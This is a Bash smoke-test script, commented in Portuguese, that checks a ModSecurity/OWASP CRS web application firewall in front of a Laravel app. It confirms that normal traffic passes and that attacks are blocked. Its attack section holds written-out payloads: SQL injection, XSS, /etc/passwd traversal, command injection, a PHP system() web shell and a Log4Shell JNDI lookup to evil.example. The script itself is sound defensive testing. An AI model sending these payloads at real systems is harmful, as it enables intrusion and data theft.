#!/usr/bin/env bash
# Teste de fumaca do WAF (Nginx + ModSecurity v3 + OWASP CRS) com a stack real do docker-compose
# (Caddy -> WAF -> PHP-FPM/Laravel) e as regras de deploy/modsecurity/.
# Uso: docker/waf/waf-smoke.sh http://localhost:8080
#
# "Bloqueado" = 403 com o cabecalho X-WAF-Block (pagina de bloqueio da ModSecurity).
# Trafego legitimo do ManaLeague NAO pode ser bloqueado nem quebrar (5xx); o status do Laravel
# (200, 302 de login, 419 de CSRF, 404...) nao importa aqui.
# Ataques classicos precisam ser bloqueados pelo WAF antes de chegar no PHP.
set -uo pipefail

BASE="${1:-http://localhost:8080}"
FAILS=0
TMP_FILE="$(mktemp)"
HDR_FILE="$(mktemp)"
head -c 4096 /dev/urandom > "$TMP_FILE"
# Git Bash no Windows: o curl nativo precisa do caminho C:/...
UPLOAD_PATH="$(cygpath -m "$TMP_FILE" 2>/dev/null || echo "$TMP_FILE")"
HDR_PATH="$(cygpath -m "$HDR_FILE" 2>/dev/null || echo "$HDR_FILE")"

request() {
    curl -s -o /dev/null -D "$HDR_PATH" -w '%{http_code}' --path-as-is "$@"
}

waf_blocked() {
    grep -qi '^x-waf-block:' "$HDR_FILE"
}

allow() {
    local label="$1"; shift
    local got; got="$(request "$@")"
    if waf_blocked; then
        printf 'FALHA %s bloqueado pelo WAF (falso positivo)  %s\n' "$got" "$label"; FAILS=$((FAILS + 1))
    elif [[ "$got" == 000 || "$got" =~ ^5 ]]; then
        printf 'FALHA %s (erro/servidor fora)  %s\n' "$got" "$label"; FAILS=$((FAILS + 1))
    else
        printf 'ok    %s  %s\n' "$got" "$label"
    fi
}

block() {
    local label="$1"; shift
    local got; got="$(request "$@")"
    if [[ "$got" == 403 ]] && waf_blocked; then
        printf 'ok    %s  %s\n' "$got" "$label"
    else
        printf 'FALHA %s (esperado 403 do WAF)  %s\n' "$got" "$label"; FAILS=$((FAILS + 1))
    fi
}

# Alguns ataques nem chegam na ModSecurity: o proprio Nginx do WAF recusa a requisicao malformada
# (traversal acima da raiz -> 400, TRACE -> 405). Tambem vale como barrado, desde que nunca chegue no
# app (o Laravel sempre responde com Set-Cookie de sessao).
reject() {
    local label="$1"; shift
    local got; got="$(request "$@")"
    if [[ "$got" == 403 ]] && waf_blocked; then
        printf 'ok    %s  %s (ModSecurity)\n' "$got" "$label"
    elif [[ "$got" == 400 || "$got" == 405 ]] && ! grep -qi '^set-cookie:' "$HDR_FILE"; then
        printf 'ok    %s  %s (recusado pelo Nginx do WAF)\n' "$got" "$label"
    else
        printf 'FALHA %s (esperado 403 do WAF ou 400/405 do Nginx)  %s\n' "$got" "$label"; FAILS=$((FAILS + 1))
    fi
}

echo "== Trafego legitimo (nao pode ser bloqueado) =="
allow "pagina inicial" "$BASE/"
allow "login (GET)" "$BASE/login"
allow "arquivo estatico" "$BASE/favicon.ico"
allow "busca de carta" "$BASE/cards/search?q=Lightning%20Bolt"
allow "busca com acento" "$BASE/cards/search?q=Ajani%2C%20o%20Le%C3%A3o"
allow "login com senha cheia de simbolos" -X POST "$BASE/login" \
    --data-urlencode "_token=Zx9kQ2wLr8vT0pN3sY6uE1aH4cJ7mB5dF2gK8iO0" \
    --data-urlencode "email=jogador@manaleague.com.br" \
    --data-urlencode "password=' OR '1'='1 -- <script>\"x\"" \
    --data-urlencode "remember=1"
allow "cadastro com senha e confirmacao com simbolos" -X POST "$BASE/register" \
    --data-urlencode "_token=abc123" --data-urlencode "name=Jogador Teste" \
    --data-urlencode "email=novo@manaleague.com.br" \
    --data-urlencode "password=<img src=x>' UNION SELECT 1--" \
    --data-urlencode "password_confirmation=<img src=x>' UNION SELECT 1--"
allow "importar lista de deck" -X POST "$BASE/me/decks/1/import" \
    --data-urlencode "_token=abc123" \
    --data-urlencode $'list=4 Lightning Bolt (2X2) 117\n2 Snapcaster Mage\n1 Jace, the Mind Sculptor\nSideboard\n2 Pyroblast'
allow "post de clube com texto livre" -X POST "$BASE/clubs/1/posts" \
    --data-urlencode "_token=abc123" \
    --data-urlencode "body=Alguém topa jogar sexta? Vou selecionar as mesas e atualizar a tabela depois :) #magic"
allow "PATCH JSON do construtor de deck" -X PATCH "$BASE/me/decks/1/cards/2/move" \
    -H 'Content-Type: application/json' -H 'Accept: application/json' \
    -d '{"board":"sideboard","quantity":1}'
allow "_method=DELETE em formulario" -X POST "$BASE/me/decks/1" \
    --data-urlencode "_token=abc123" --data-urlencode "_method=DELETE"
allow "cookies de sessao do Laravel" "$BASE/dashboard" \
    -H 'Cookie: XSRF-TOKEN=eyJpdi...wIn0%3D; manaleague_session=eyJpdi...PSJ9%3D; remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d=eyJpdiI6Ij0nLS0%3D'
allow "upload da foto de perfil" -X POST "$BASE/me/profile/photo" \
    -F "_token=abc123" -F "photo=@${UPLOAD_PATH};filename=foto.jpg;type=image/jpeg"

echo "== Ataques (precisam ser bloqueados pela ModSecurity) =="
block "SQL injection na query" "$BASE/cards/search?q=1%27%20OR%20%271%27%3D%271"
block "SQL injection UNION" "$BASE/players?id=1%20UNION%20SELECT%20password%20FROM%20users--"
block "XSS refletido" "$BASE/cards/search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E"
block "XSS no corpo" -X POST "$BASE/clubs/1/posts" --data-urlencode "body=<img src=x onerror=alert(1)>"
block "XSS no campo de e-mail do login" -X POST "$BASE/login" --data-urlencode "email=<script>alert(1)</script>"
reject "path traversal" "$BASE/avatars/..%2F..%2F..%2Fetc%2Fpasswd"
block "traversal em parametro" "$BASE/?file=../../../../etc/passwd"
block "command injection" "$BASE/?host=127.0.0.1%3Bcat%20%2Fetc%2Fpasswd"
block "PHP injection" -X POST "$BASE/clubs/1/posts" --data-urlencode 'body=<?php system($_GET["c"]); ?>'
block "scanner sqlmap" "$BASE/" -A 'sqlmap/1.8.2#stable (https://sqlmap.org)'
block "Log4Shell" "$BASE/" -H 'X-Api-Version: ${jndi:ldap://evil.example/a}'
reject "metodo nao permitido" -X TRACE "$BASE/"

rm -f "$TMP_FILE" "$HDR_FILE"
if (( FAILS > 0 )); then
    echo "$FAILS verificacao(oes) falharam"; exit 1
fi
echo "WAF ok"
